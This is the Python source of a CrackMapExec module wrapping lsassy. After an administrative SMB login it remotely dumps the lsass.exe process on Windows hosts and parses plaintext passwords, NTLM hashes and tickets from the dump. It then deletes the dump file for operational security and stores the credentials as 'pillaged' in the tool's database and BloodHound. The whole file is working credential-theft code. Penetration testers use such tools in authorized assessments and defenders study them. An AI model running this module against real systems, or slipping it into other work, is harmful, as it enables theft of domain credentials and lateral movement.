#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com [FR]
#  https://en.hackndo.com [EN]

from lsassy.dumper import Dumper
from lsassy.impacketfile import ImpacketFile
from lsassy.parser import Parser
from lsassy.session import Session

from cme.helpers.bloodhound import add_user_bh


class CMEModule:
    name = "lsassy"
    description = "Dump lsass and parse the result remotely with lsassy"
    supported_protocols = ["smb"]
    opsec_safe = True  # writes temporary files, and it's possible for them to not be deleted
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.method = None

    def options(self, context, module_options):
        """
        METHOD              Method to use to dump lsass.exe with lsassy
        """
        self.method = "comsvcs"
        if "METHOD" in module_options:
            self.method = module_options["METHOD"]

    def on_admin_login(self, context, connection):
        host = connection.host
        domain_name = connection.domain
        username = connection.username
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        session = Session()
        session.get_session(
            address=host,
            target_ip=host,
            port=445,
            lmhash=lmhash,
            nthash=nthash,
            username=username,
            password=password,
            domain=domain_name,
        )

        if session.smb_session is None:
            context.log.fail("Couldn't connect to remote host")
            return False

        dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.method)
        if dumper is None:
            context.log.fail("Unable to load dump method '{}'".format(self.method))
            return False

        file = dumper.dump()
        if file is None:
            context.log.fail("Unable to dump lsass")
            return False

        parsed = Parser(file).parse()
        if parsed is None:
            context.log.fail("Unable to parse lsass dump")
            return False
        credentials, tickets, masterkeys = parsed

        file.close()
        context.log.debug(f"Closed dumper file")
        file_path = file.get_file_path()
        context.log.debug(f"File path: {file_path}")
        try:
            deleted_file = ImpacketFile.delete(session, file_path)
            if deleted_file:
                context.log.debug(f"Deleted dumper file")
            else:
                context.log.fail(f"[OPSEC] No exception, but failed to delete file: {file_path}")
        except Exception as e:
            context.log.fail(f"[OPSEC] Error deleting temporary lsassy dumper file {file_path}: {e}")

        if credentials is None:
            credentials = []

        for cred in credentials:
            c = cred.get_object()
            context.log.debug(f"Cred: {c}")

        credentials = [cred.get_object() for cred in credentials if cred.ticket is None and cred.masterkey is None and not cred.get_username().endswith("$")]
        credentials_unique = []
        credentials_output = []
        context.log.debug(f"Credentials: {credentials}")

        for cred in credentials:
            context.log.debug(f"Credential: {cred}")
            if [
                cred["domain"],
                cred["username"],
                cred["password"],
                cred["lmhash"],
                cred["nthash"],
            ] not in credentials_unique:
                credentials_unique.append(
                    [
                        cred["domain"],
                        cred["username"],
                        cred["password"],
                        cred["lmhash"],
                        cred["nthash"],
                    ]
                )
                credentials_output.append(cred)

        context.log.debug(f"Calling process_credentials")
        self.process_credentials(context, connection, credentials_output)

    def process_credentials(self, context, connection, credentials):
        if len(credentials) == 0:
            context.log.display("No credentials found")
        credz_bh = []
        domain = None
        for cred in credentials:
            if cred["domain"] == None:
                cred["domain"] = ""
            domain = cred["domain"]
            if "." not in cred["domain"] and cred["domain"].upper() in connection.domain.upper():
                domain = connection.domain  # slim shady
            self.save_credentials(
                context,
                connection,
                cred["domain"],
                cred["username"],
                cred["password"],
                cred["lmhash"],
                cred["nthash"],
            )
            self.print_credentials(
                context,
                cred["domain"],
                cred["username"],
                cred["password"],
                cred["lmhash"],
                cred["nthash"],
            )
            credz_bh.append({"username": cred["username"].upper(), "domain": domain.upper()})
            add_user_bh(credz_bh, domain, context.log, connection.config)

    @staticmethod
    def print_credentials(context, domain, username, password, lmhash, nthash):
        if password is None:
            password = ":".join(h for h in [lmhash, nthash] if h is not None)
        output = "%s\\%s %s" % (domain, username, password)
        context.log.highlight(output)

    @staticmethod
    def save_credentials(context, connection, domain, username, password, lmhash, nthash):
        host_id = context.db.get_hosts(connection.host)[0][0]
        if password is not None:
            credential_type = "plaintext"
        else:
            credential_type = "hash"
            password = ":".join(h for h in [lmhash, nthash] if h is not None)
        context.db.add_credential(credential_type, domain, username, password, pillaged_from=host_id)
